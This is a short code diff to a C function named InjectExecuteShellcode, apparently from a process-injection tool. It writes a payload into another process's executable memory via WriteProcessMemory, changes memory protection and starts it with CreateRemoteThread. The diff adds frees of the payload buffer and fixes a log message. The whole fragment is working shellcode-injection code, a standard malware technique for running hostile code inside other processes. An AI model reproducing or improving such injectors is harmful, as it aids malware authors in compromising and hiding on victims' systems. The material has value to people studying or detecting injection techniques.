@@ -67,9 +67,11 @@ unsigned InjectExecuteShellcode(Resource* restrict pResource, Injector* restrict
     pWriteProcessMemory = (WriteProcessMemory_t)GetProcAddress(GetModuleHandleA("kernel32.dll"), "WriteProcessMemory");
     if (!(pWriteProcessMemory(hProcess, (LPVOID)exec_mem, (LPVOID)payload, size+1, NULL)))
     {
+        free(payload);
         LogEvent(pInjector, "Failed to write payload to executable memory", 0);
         return -1u;
     }
+    free(payload);
     LogEvent(pInjector, "Write success", 0);
 
     LogEvent(pInjector, "Changing virtual protection permissions..", 0);
@@ -78,7 +80,7 @@ unsigned InjectExecuteShellcode(Resource* restrict pResource, Injector* restrict
         LogEvent(pInjector, "Failed to change virtual protection permissions", 0);
         return -1u;
     }
-    LogEvent(pInjector, "Protect changed", 0);
+    LogEvent(pInjector, "Protection changed", 0);
 
     LogEvent(pInjector, "Creating remote thread..", 0);
     if (!(hThread = CreateRemoteThread(hProcess, NULL, 0, (LPTHREAD_START_ROUTINE)exec_mem, NULL, 0, NULL)))
